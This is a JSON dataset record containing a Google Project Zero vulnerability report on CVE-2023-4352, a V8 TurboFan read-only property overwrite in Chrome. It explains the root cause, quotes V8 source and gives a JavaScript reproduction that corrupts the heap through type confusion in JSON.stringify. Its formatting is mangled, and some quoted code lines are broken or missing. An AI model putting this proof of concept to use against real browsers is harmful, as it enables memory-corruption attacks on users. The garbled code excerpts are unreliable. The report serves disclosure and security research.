{
    "text": "vul_name : Chrome Read-Only Property Overwrite ， vul_cve : CVE-2023-4352 ， vul_poc : Chrome : Read-only property overwrite in TurboFan ， VULNERABILITY DETAILS ， While collecting information for a property store , TurboFan bails out if the property isn't writable [ 2 ] . Unfortunately , the branch condition [ 1 ] does not include one of the store modes , namely `kDefine`. This allows an attacker to overwrite arbitrary non-configurable , read-only properties. It takes a few extra steps to convince TurboFan to compile a vulnerable function - see the reproduction case section. ， This issue can be abused to trigger a type confusion in `JsonStringifier : Serialize_`. The function assumes that a `JSRawJson` object can only have a string as its `rawJSON` property value , because `JSRawJson : Create` freezes the object [ 3 ] before returning it to the user. Therefore , `Serialize_` doesn't perform a type check before casting the result of `GetProperty` to the string type [ 4 ] . `AppendString` might then attempt to concatenate the bogus string [ 5 ]  , corrupting the heap. ， REFERENCES ， ` ， PropertyAccessInfo AccessInfoFactory : ComputePropertyAccessInfo (  ， MapRef map , NameRef name , AccessMode access_mode ) const { ，  [ . ]  ， PropertyDetails details = PropertyDetails : Empty (  )  ;  ， InternalIndex index = InternalIndex : NotFound (  )  ;  ， } ， access_mode = AccessMode : kStoreInLiteral ) { ， DCHECK (  ! map.is_dictionary_map (  )  ;  ， / Don't bother optimizing stores to read-only properties. ，  [ . ]  ， } ， ` ， ` ， MaybeHandle<JSRawJson> JSRawJson : Create ( Isolate * isolate ,  ， Handle<Object> text ) { ， DCHECK ( v8_flags.harmony_json_parse_with_source )  ;  ， Handle<String> json_string ;  ， ASSIGN_RETURN_ON_EXCEPTION ( isolate , json_string ,  ， Object : ToString ( isolate , text )  , JSRawJson )  ;  ， Handle<String> flat = String : Flatten ( isolate , json_string )  ;  ， DCHECK ( isolate->has_pending_exception (  )  ;  ， } ， } else { ， DCHECK ( isolate->has_pending_exception (  )  ;  ， } ， } ， Handle<JSObject> result = ， isolate->factory (  ) ->NewJSObjectFromMap ( isolate->js_raw_json_map (  )  ;  ， result->InObjectPropertyAtPut ( JSRawJson : kRawJsonInitialIndex ,  * flat )  ;  ， JSObject : SetIntegrityLevel ( isolate , result , FROZEN , kThrowOnError ) .Check (  )  ; / 3 ， } ， ` ， ` ， JsonStringifier : Result JsonStringifier : Serialize_ ( Handle<Object> object ,  ， bool comma ,  ， Handle<Object> key ) { ，  [ . ]  ， InstanceType instance_type = ， HeapObject : cast (  * object ) .map ( cage_base ) .instance_type (  )  ;  ， switch ( instance_type ) { ，  [ . ]  ， case JS_RAW_JSON_TYPE :  ， DCHECK ( v8_flags.harmony_json_parse_with_source )  ;  ， { ， Handle<JSRawJson> raw_json_obj = Handle<JSRawJson> : cast ( object )  ;  ， Handle<String> raw_json ;  ， / Fast path : the object returned by JSON.rawJSON has its initial map ， / intact. ， raw_json = Handle<String> : cast ( handle (  ， raw_json_obj->InObjectPropertyAt ( JSRawJson : kRawJsonInitialIndex )  ,  ， isolate_ )  ;  ， } else { ， / Slow path : perform a property get for \\\"rawJSON\\\". Because raw JSON ， / objects are created frozen , it is still guaranteed that there will ， / be a property named \\\"rawJSON\\\" that is a String. Their initial maps ， / only change due to VM-internal operations like being optimized for ， / being used as a prototype. ， raw_json = Handle<String> : cast ( / 4 ， JSObject : GetProperty ( isolate_ , raw_json_obj ,  ， isolate_->factory (  ) ->raw_json_string (  )  ， .ToHandleChecked (  )  ;  ， } ， builder_.AppendString ( raw_json )  ; / 5 ， } ，  [ . ]  ， } ， ` ， VERSION ， Google Chrome 114.0.5735.90 ( Official Build )  ， V8 version 11.6.0 ， REPRODUCTION CASE ， ` ， const PROP_NAME = \\\"rawJSON\\\" ,  ， PROP_VALUE = 0x21212121 ; / Will be interpreted as a compressed pointer by `Serialize_`. ， let define_property_holder = {} ;  ， define_property_holder.for_deprecation = 1 ; / See below. ， class Trigger extends ReturnHolder { / Extend a function that returns a value so that it possible ， / to store on an existing object. ，  [ PROP_NAME ] = ( / A keyed class property initializer is translated to a `kDefine` store. ， this [ PROP_NAME ]  , / The store operation performed on the target object will always throw in ， / the interpreter , so the object's map won't be added to the feedback slot. ， / Emit a load so that its feedback map can be reused by the store. ， PROP_VALUE ， } ;  ， new Trigger ; / The store operation has to have a non-empty feedback slot. Use a regular object ， / with the writable target property for that. ， define_property_holder.for_deprecation = 1.1 ; / Deprecate the map in the feedback vector so that ， / it's discarded by TurboFan. ， define_property_holder = JSON.rawJSON ( \\\"1\\\" )  ; / The special target object. ， %OptimizeFunctionOnNextCall ( Trigger )  ;  ， new Trigger ;  ， JSON.stringify ( define_property_holder )  ;  ， ` ， CREDIT INFORMATION ， Sergei Glazunov of Google Project Zero ， This bug is subject to a 90-day disclosure deadline. If a fix for this issue is made available to users before the end of the 90-day deadline , this bug report will become public 30 days after the fix was made available. Otherwise , this bug report will become public at the deadline. The scheduled deadline is 2023-09-05. ， Related CVE Numbers : CVE-2023-4352. ， Found by : glazunov @ google.com",
    "time": "2023.09.15"
}